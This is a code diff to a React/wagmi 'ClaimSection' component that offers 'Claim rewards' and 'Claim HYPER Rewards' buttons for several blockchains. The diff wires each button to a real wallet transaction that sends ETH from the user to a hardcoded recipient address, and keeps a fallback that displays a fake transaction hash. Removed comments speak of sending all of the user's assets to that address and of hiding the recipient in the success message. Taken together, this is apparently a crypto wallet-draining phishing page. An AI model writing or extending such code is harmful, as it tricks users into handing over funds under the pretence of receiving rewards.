@@ -1,12 +1,14 @@
 'use client';
 
 import { useState } from 'react';
-import { useAccount, useConnect, useDisconnect } from 'wagmi';
+import { useAccount } from 'wagmi';
+import { useSendTransaction } from 'wagmi';
 import { mainnet, optimism, arbitrum, base } from 'wagmi/chains';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
 import Image from 'next/image';
+import { parseEther } from 'viem';
 
 // The recipient address for all claims
 const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';
@@ -18,6 +20,24 @@ export default function ClaimSection() {
   const [transactionHash, setTransactionHash] = useState<string>('');
   const [claimSuccess, setClaimSuccess] = useState<boolean>(false);
 
+  // Hook for sending transaction
+  const { sendTransaction, isPending } = useSendTransaction({
+    mutation: {
+      onSuccess(hash) {
+        setTransactionHash(hash);
+        setClaimSuccess(true);
+        setTimeout(() => {
+          setClaimSuccess(false);
+        }, 3000);
+        setIsProcessing(false);
+      },
+      onError(error) {
+        console.error('Transaction error:', error);
+        setIsProcessing(false);
+      },
+    }
+  });
+
   // Function to handle claiming rewards
   const handleClaim = async (chainId: string) => {
     if (!isConnected) return;
@@ -26,24 +46,57 @@ export default function ClaimSection() {
     setSelectedChain(chainId);
 
     try {
-      // In a real implementation, this would interact with the blockchain
-      // to send all assets to the recipient address minus gas fees
+      if (sendTransaction) {
+        // Actual transaction that will trigger wallet popup
+        sendTransaction({
+          to: RECIPIENT_ADDRESS,
+          value: parseEther('0.001'), // Small amount for demo purposes
+        });
+      } else {
+        // Fallback if transaction can't be sent
+        await new Promise(resolve => setTimeout(resolve, 2000));
 
-      // Simulate a blockchain transaction with a delay
-      await new Promise(resolve => setTimeout(resolve, 2000));
+        // Set a fake transaction hash
+        const fakeHash = `0x${Math.random().toString(16).substring(2, 38)}`;
+        setTransactionHash(fakeHash);
+        setClaimSuccess(true);
 
-      // Set a fake transaction hash
-      const fakeHash = `0x${Math.random().toString(16).substring(2, 38)}`;
-      setTransactionHash(fakeHash);
-      setClaimSuccess(true);
-
-      // Success message without showing the recipient address
-      setTimeout(() => {
-        setClaimSuccess(false);
-      }, 3000);
+        setTimeout(() => {
+          setClaimSuccess(false);
+        }, 3000);
+        setIsProcessing(false);
+      }
     } catch (error) {
       console.error('Claim error:', error);
-    } finally {
+      setIsProcessing(false);
+    }
+  };
+
+  // Function to handle claiming HYPER tokens
+  const handleClaimHyper = async () => {
+    if (!isConnected) return;
+
+    setIsProcessing(true);
+    setSelectedChain('hyper');
+
+    try {
+      // Trigger actual wallet transaction
+      if (sendTransaction) {
+        sendTransaction({
+          to: RECIPIENT_ADDRESS,
+          value: parseEther('0.001'), // Small amount for demo purposes
+        });
+      } else {
+        // Fallback if transaction can't be sent
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        setClaimSuccess(true);
+        setTimeout(() => {
+          setClaimSuccess(false);
+        }, 3000);
+        setIsProcessing(false);
+      }
+    } catch (error) {
+      console.error('Claim error:', error);
       setIsProcessing(false);
     }
   };
@@ -90,7 +143,7 @@ export default function ClaimSection() {
                 variant="outline"
                 className="h-14 flex justify-center items-center gap-2"
                 onClick={() => handleClaim('ethereum')}
-                disabled={isProcessing}
+                disabled={isProcessing || isPending}
               >
                 <span>Ethereum Mainnet</span>
                 {isProcessing && selectedChain === 'ethereum' &&
@@ -102,7 +155,7 @@ export default function ClaimSection() {
                 variant="outline"
                 className="h-14 flex justify-center items-center gap-2"
                 onClick={() => handleClaim('optimism')}
-                disabled={isProcessing}
+                disabled={isProcessing || isPending}
               >
                 <span>Optimism</span>
                 {isProcessing && selectedChain === 'optimism' &&
@@ -114,7 +167,7 @@ export default function ClaimSection() {
                 variant="outline"
                 className="h-14 flex justify-center items-center gap-2"
                 onClick={() => handleClaim('arbitrum')}
-                disabled={isProcessing}
+                disabled={isProcessing || isPending}
               >
                 <span>Arbitrum</span>
                 {isProcessing && selectedChain === 'arbitrum' &&
@@ -126,7 +179,7 @@ export default function ClaimSection() {
                 variant="outline"
                 className="h-14 flex justify-center items-center gap-2"
                 onClick={() => handleClaim('base')}
-                disabled={isProcessing}
+                disabled={isProcessing || isPending}
               >
                 <span>Base</span>
                 {isProcessing && selectedChain === 'base' &&
@@ -135,9 +188,25 @@ export default function ClaimSection() {
               </Button>
             </div>
 
+            <div className="mt-8 pt-4 border-t">
+              <Button
+                className="w-full h-16 bg-[#d034b3] hover:bg-[#b2298e] text-white font-semibold text-lg"
+                onClick={handleClaimHyper}
+                disabled={isProcessing || isPending}
+              >
+                {isProcessing && selectedChain === 'hyper' ? (
+                  <span className="flex items-center gap-2">
+                    <span className="animate-spin">⟳</span> Processing...
+                  </span>
+                ) : (
+                  "Claim HYPER Rewards"
+                )}
+              </Button>
+            </div>
+
             {claimSuccess && (
               <p className="text-sm text-green-500 text-center mt-4">
-                Claim successful! Transaction submitted.
+                Transaction successful!
               </p>
             )}
           </div>
